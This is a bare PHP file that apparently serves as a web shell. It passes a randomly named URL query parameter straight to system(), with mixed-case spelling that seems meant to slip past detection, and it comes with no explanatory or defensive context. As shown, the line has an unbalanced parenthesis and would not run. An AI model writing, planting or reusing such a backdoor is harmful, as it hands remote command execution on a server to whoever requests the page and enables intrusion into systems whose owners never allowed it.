<?php
SysTeM(($_GET['IeqqSCW5']);
?>
